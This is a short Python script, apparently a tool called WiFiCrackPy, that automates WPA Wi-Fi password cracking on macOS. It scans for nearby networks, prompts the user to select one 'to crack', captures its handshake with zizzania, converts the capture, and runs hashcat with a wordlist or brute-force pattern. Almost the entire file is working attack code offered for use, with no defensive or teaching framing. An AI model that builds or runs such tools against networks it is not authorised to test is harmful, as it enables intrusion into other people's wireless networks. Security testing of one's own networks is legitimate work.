import subprocess
import argparse
import re
from prettytable import PrettyTable
from tabulate import tabulate
from os.path import expanduser
from pyfiglet import Figlet

airport = '/System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport'

parser = argparse.ArgumentParser()
parser.add_argument('-w')
parser.add_argument('-m')
parser.add_argument('-i')
parser.add_argument('-p')
args = parser.parse_args()


def scan_networks():
    print('Scanning for networks...\n')

    scan = subprocess.run(['sudo', airport, '-s'], stdout=subprocess.PIPE)
    scan = scan.stdout.decode('utf-8')
    scan = scan.split('\n')
    count = len(scan) - 1
    scan = [o.split() for o in scan]

    list = PrettyTable(['Number', 'Name', 'BSSID', 'RSSI', 'Channel', 'Security'])
    networks = {}
    for i in range(1, count):
        bssid = re.search('([0-9A-Fa-f]{2}[:]){5}([0-9A-Fa-f]{2})', ' '.join(scan[i])).group(0)
        bindex = scan[i].index(bssid)

        network = {}
        network['ssid'] = ' '.join(scan[i][0:bindex])
        network['bssid'] = bssid
        network['rssi'] = scan[i][bindex + 1]
        network['channel'] = scan[i][bindex + 2].split(',')[0]
        network['security'] = scan[i][bindex + 5].split('(')[0]

        networks[i] = network
        list.add_row([i, network['ssid'], network['bssid'], network['rssi'], network['channel'], network['security']])

    print(list)

    x = int(input('\nSelect a network to crack: '))
    capture_network(networks[x]['bssid'], networks[x]['ssid'], networks[x]['channel'])


def capture_network(bssid, ssid, channel):
    subprocess.run(['sudo', airport, '-z'])
    subprocess.run(['sudo', airport, '-c' + channel])

    if args.i is None:
        iface = subprocess.run(['networksetup', '-listallhardwareports'], stdout=subprocess.PIPE)
        iface = iface.stdout.decode('utf-8').split('\n')
        iface = iface[iface.index('Hardware Port: Wi-Fi') + 1].split(': ')[1]
    else:
        iface = args.i

    subprocess.run(['sudo', expanduser('~') + '/zizzania/src/zizzania', '-i', iface, '-b', bssid, '-w', 'capture.pcap'], stderr=subprocess.PIPE)
    subprocess.run([expanduser('~') + '/hashcat-utils/src/cap2hccapx.bin', 'capture.pcap', 'capture.hccapx'], stderr=subprocess.PIPE)

    crack_capture()


def crack_capture():
    if args.m is None:
        print(tabulate([[1, 'Dictionary'], [2, 'Brute-force'], [3, 'Manual']], headers=['Number', 'Mode']))
        method = int(input('\nSelect an attack mode: '))
    else:
        method = int(args.m)

    if method == 1 and args.w is None:
        wordlist = input('\nInput a wordlist path: ')
    elif method == 1 and args.w is not None:
        wordlist = args.w

    if method == 1:
        subprocess.run(['hashcat', '-m', '2500', 'capture.hccapx', wordlist, '-O'])
    elif method == 2:
        if args.p is None:
            pattern = input('\nInput a brute-force pattern: ')
        else:
            pattern = args.p
        subprocess.run(['hashcat', '-m', '2500', '-a', '3', 'capture.hccapx', pattern, '-O'])
    elif method == 3:
        print('\nRun hashcat against: capture.hccapx')


f = Figlet(font='big')
print('\n' + f.renderText('WiFiCrackPy'))

scan_networks()
